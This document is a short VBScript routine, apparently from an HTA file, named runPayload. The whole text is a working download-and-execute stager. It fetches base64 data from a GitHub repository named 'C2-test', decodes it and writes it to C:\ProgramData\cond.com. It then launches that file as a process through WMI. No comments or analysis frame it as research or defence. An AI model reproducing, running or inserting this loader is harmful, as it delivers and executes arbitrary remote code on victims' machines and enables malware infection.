Sub runPayload()
    Dim url, xmlHttp
    url = "https://raw.githubusercontent.com/ParkJeongKyun/C2-test/master/build/encoded_encrypt.txt"

    Set xmlHttp = CreateObject("MSXML2.ServerXMLHTTP.6.0")

    xmlHttp.open "GET", url, False
    xmlHttp.send

    If xmlHttp.status <> 200 Then
        MsgBox "[-] Download failed! HTTP Status: " & xmlHttp.status
        window.close
        Exit Sub
    End If
    base64Text = xmlHttp.ResponseText

    Dim xmlDoc, b64Node
    Set xmlDoc = CreateObject("Microsoft.XMLDOM")
    Set b64Node = xmlDoc.CreateElement("tmp")
    b64Node.DataType = "bin.base64"
    b64Node.Text = base64Text

    Dim stream
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write b64Node.NodeTypedValue
    stream.SaveToFile "C:\ProgramData\cond.com", 2 ' 2: Overwrite
    stream.Close

    Dim wmi, wmiProcess
    Dim processId
    Dim result
    Dim workingDir

    Set wmi = GetObject("winmgmts:{impersonationLevel=impersonate}!\\.\root\cimv2")
    Set wmiProcess = wmi.Get("Win32_Process")

    Set shell = CreateObject("WScript.Shell")
    workingDir = shell.CurrentDirectory
    result = wmiProcess.Create("C:\ProgramData\cond.com", workingDir, Null, processId)
End Sub